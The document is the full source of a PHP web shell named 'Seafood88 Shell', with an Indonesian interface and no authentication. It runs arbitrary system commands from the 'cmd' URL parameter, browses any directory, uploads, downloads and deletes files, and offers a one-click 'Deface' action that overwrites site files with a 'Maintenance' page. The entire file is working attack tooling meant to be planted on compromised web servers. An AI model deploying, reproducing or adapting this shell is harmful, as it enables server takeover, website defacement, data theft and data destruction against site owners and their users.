<?php
session_start();

function h($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

$message = '';
$msgColor = '';

// Handle change directory via ?cd=...
if (isset($_GET['cd'])) {
    $raw = rawurldecode($_GET['cd']);

    // If absolute path (unix / or windows drive like C:\), use it directly; otherwise resolve relative to current cwd
    if (PHP_OS_FAMILY === 'Windows') {
        // Windows absolute: starts with letter + : or \\ (UNC)
        if (preg_match('#^[A-Za-z]:[\\/]|^\\\\\\\\#', $raw)) {
            $candidate = realpath($raw);
        } else {
            $candidate = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $raw);
        }
    } else {
        // Unix absolute: starts with /
        if (strpos($raw, '/') === 0) {
            $candidate = realpath($raw);
        } else {
            $candidate = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $raw);
        }
    }

    if ($candidate && is_dir($candidate)) {
        $_SESSION['cwd'] = $candidate;
        $message = "Berpindah ke: " . h($_SESSION['cwd']);
        $msgColor = "green";
    } else {
        $message = "Direktori tidak ditemukan: " . h($raw);
        $msgColor = "red";
    }
}

// Exec command (kept as GET cmd)
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    chdir($_SESSION['cwd']);
    ob_start();
    system($cmd);
    $output = ob_get_clean();
}

// Upload file
if (isset($_FILES['upload_file'])) {
    $uploadDir = $_SESSION['cwd'] . DIRECTORY_SEPARATOR;
    $uploadFile = $uploadDir . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadFile)) {
        $message = "File berhasil diupload: " . h(basename($uploadFile));
        $msgColor = "green";
    } else {
        $message = "Upload gagal!";
        $msgColor = "red";
    }
}

// Deface file
if (isset($_POST['deface_file'])) {
    $targetFile = $_POST['deface_file'];
    $fullPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $targetFile);
    $defaceContent = "<html><body style='background:#111;color:#f33;font-family:sans-serif;'><h1 style='text-align:center;margin-top:20vh;font-size:4rem;'>Maintenance</h1></body></html>";

    if ($fullPath && strpos($fullPath, $_SESSION['cwd']) === 0 && is_file($fullPath)) {
        $result = file_put_contents($fullPath, $defaceContent);
        if ($result === false) {
            $message = "Gagal melakukan deface pada file: " . h($targetFile);
            $msgColor = "red";
        } else {
            $message = "Berhasil melakukan deface pada file: " . h($targetFile);
            $msgColor = "green";
        }
    } else {
        $message = "File tidak ditemukan atau bukan file: " . h($targetFile);
        $msgColor = "red";
    }
}

// Delete file
if (isset($_GET['delete'])) {
    $fileToDelete = $_GET['delete'];
    $fullPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $fileToDelete);
    if ($fullPath && strpos($fullPath, $_SESSION['cwd']) === 0 && is_file($fullPath)) {
        if (unlink($fullPath)) {
            $message = "File berhasil dihapus: " . h($fileToDelete);
            $msgColor = "green";
        } else {
            $message = "Gagal menghapus file: " . h($fileToDelete);
            $msgColor = "red";
        }
    } else {
        $message = "File tidak ditemukan atau bukan file: " . h($fileToDelete);
        $msgColor = "red";
    }
}

// Download file
if (isset($_GET['download'])) {
    $fileToDownload = $_GET['download'];
    $fullPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $fileToDownload);
    if ($fullPath && strpos($fullPath, $_SESSION['cwd']) === 0 && is_file($fullPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fullPath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($fullPath));
        readfile($fullPath);
        exit;
    } else {
        $message = "File tidak ditemukan atau bukan file: " . h($fileToDownload);
        $msgColor = "red";
    }
}
?>
<!DOCTYPE html>
<html lang="id" class="bg-black text-orange-400">
<head>
    <meta charset="UTF-8" />
    <title>Simple PHP Shell & Deface Tool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'VT323', monospace;
            background-color: #000;
            color: #ff8c00;
            font-size: 18px;
        }

        h1, h2 {
            font-weight: normal;
            color: #ff8c00;
        }

        a {
            color: #ff8c00;
        }

        input[type="text"],
        input[type="file"] {
            background: #111;
            color: #ff8c00;
            border: 1px solid #ff8c00;
            padding: 4px 8px;
            width: 100%;
        }

        pre {
            background: #000;
            color: #00ff00;
            padding: 10px;
            border: 1px solid #222;
            overflow-x: auto;
            white-space: pre-wrap;
        }

        button,
        a.button {
            background: #ff8c00;
            color: #000;
            border: none;
            padding: 4px 10px;
            text-decoration: none;
            cursor: pointer;
            font-family: 'VT323', monospace;
            font-size: 18px;
        }

        button:hover,
        a.button:hover {
            background: #ffa733;
        }

        .panel {
            background: #111;
            border: 1px solid #222;
            padding: 10px;
            margin-bottom: 20px;
        }

        ul {
            list-style: none;
            padding-left: 0;
        }

        li {
            margin-bottom: 6px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .msg {
            text-align: center;
            padding: 10px;
            border: 1px solid #ff8c00;
            margin-bottom: 20px;
        }

        .text-green {
            color: #00ff00;
        }

        .text-red {
            color: #ff3333;
        }

        nav a {
            text-decoration: none;
        }

        nav a:hover {
            text-decoration: underline;
        }

        ::file-selector-button {
            background: #ff8c00;
            color: #000;
            border: none;
            padding: 4px 8px;
            cursor: pointer;
        }

        ::file-selector-button:hover {
            background: #ffa733;
        }
    </style>
</head>

<body class="p-6">

    <h3 class="text-3xl mb-4 text-center">Seafood88 Shell</h3>

    <?php if ($message): ?>
        <div class="msg <?php echo $msgColor === 'green' ? 'text-green' : 'text-red'; ?>">
            <?php echo h($message); ?>
        </div>
    <?php endif; ?>

    <!-- Breadcrumb navigation -->
    <div class="panel">
        <h2 class="text-xl mb-2">Direktori Saat Ini:</h2>
        <nav class="flex flex-wrap gap-1 font-mono select-none" aria-label="Breadcrumb">
            <?php
            $parts = explode(DIRECTORY_SEPARATOR, $_SESSION['cwd']);
            $accum = '';

            if (PHP_OS_FAMILY === 'Windows' && preg_match('/^[A-Z]:$/i', $parts[0])) {
                $accum = array_shift($parts);
                echo "<a href='?cd=" . rawurlencode($accum) . "'>" . h($accum) . "</a>";
            } else {
                if (empty($parts[0])) {
                    echo "<a href='?cd=" . rawurlencode('/') . "'>/</a>";
                    array_shift($parts);
                    $accum = '/';
                }
            }

            foreach ($parts as $index => $part) {
                if ($part === '') continue;
                $accum = rtrim($accum, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
                echo "<span>/</span><a href='?cd=" . rawurlencode($accum) . "'>" . h($part) . "</a>";
            }
            ?>
        </nav>
    </div>

    <!-- Folder & File list -->
    <div class="panel overflow-auto max-h-96">
        <h2 class="text-xl mb-2">Isi Folder:</h2>
        <ul>
            <?php
            $items = scandir($_SESSION['cwd']);
            foreach ($items as $file) {
                if ($file === '.' || $file === '..') continue;
                $fullPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file;
                $real = realpath($fullPath);
                if ($real === false) continue;

                if (is_dir($real)) {
                    echo "<li><a href='?cd=" . rawurlencode($real) . "'>[DIR] " . h($file) . "</a></li>";
                } else {
                    echo "<li>
                            <span>[FILE] " . h($file) . "</span>
                            <div class='flex gap-2'>
                                <form method='post' onsubmit='return confirm(\"Deface file " . h($file) . "?\")'>
                                    <input type='hidden' name='deface_file' value='" . h($file) . "' />
                                    <button type='submit'>Deface</button>
                                </form>
                                <a href='?download=" . urlencode($file) . "' class='button'>Download</a>
                                <a href='?delete=" . urlencode($file) . "' class='button' onclick='return confirm(\"Hapus file " . h($file) . "?\")'>Delete</a>
                            </div>
                        </li>";
                }
            }
            ?>
        </ul>
    </div>

    <!-- Form upload -->
    <div class="panel">
        <h2 class="text-xl mb-2">Upload File:</h2>
        <form method="post" enctype="multipart/form-data" class="flex gap-4 items-center">
            <input type="file" name="upload_file">
            <button type="submit">Upload</button>
        </form>
    </div>

    <!-- Form shell -->
    <div class="panel">
        <h2 class="text-xl mb-2">Eksekusi Perintah Shell:</h2>
        <form method="get" class="flex gap-4 items-center">
            <input type="text" name="cmd" placeholder="Masukkan perintah shell">
            <button type="submit">Jalankan</button>
        </form>
        <?php if (isset($output)): ?>
        <pre class="mt-4"><?php echo h($output); ?></pre>
        <?php endif; ?>
    </div>

</body>
</html>
